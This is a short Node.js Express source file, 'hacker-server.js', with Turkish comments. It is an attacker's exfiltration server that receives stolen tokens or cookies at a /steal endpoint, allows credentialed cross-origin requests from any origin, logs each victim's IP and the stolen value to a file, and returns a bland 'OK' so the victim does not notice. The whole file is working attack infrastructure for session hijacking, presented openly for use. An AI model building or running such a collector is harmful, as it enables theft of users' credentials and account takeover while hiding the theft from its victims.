// hacker-server.js
const express = require('express');
const cors = require('cors');
const fs = require('fs');

const app = express();

// 1. CORS izinleri (Her yerden gelen veri isteklerini kabul etmesi için)
app.use(cors({ origin: true, credentials: true }));
app.use(express.json());

// GET isteği ile parametreden gelen veriyi alma (Örn: /steal?token=...)
app.get('/steal', (req, res) => {
  const stolenData = req.query.token || req.query.cookie;
  const clientIp = req.ip;
  const time = new Date().toISOString();

  const logMessage = `[${time}] IP: ${clientIp} | Çalınan Veri: ${stolenData}\n`;

  console.log('🔴 ZAFİYET TETİKLENDİ! Gelen Veri:', logMessage);

  // Çalınan veriyi bir metin dosyasına yaz
  fs.appendFileSync('stolen_data.txt', logMessage);

  // Kurban fark etmesin diye boş/başarılı yanıt dön
  res.status(200).send('OK');
});

app.listen(4000, () => {
  console.log('Saldırgan Sunucusu http://localhost:4000 üzerinde dinliyor...');
});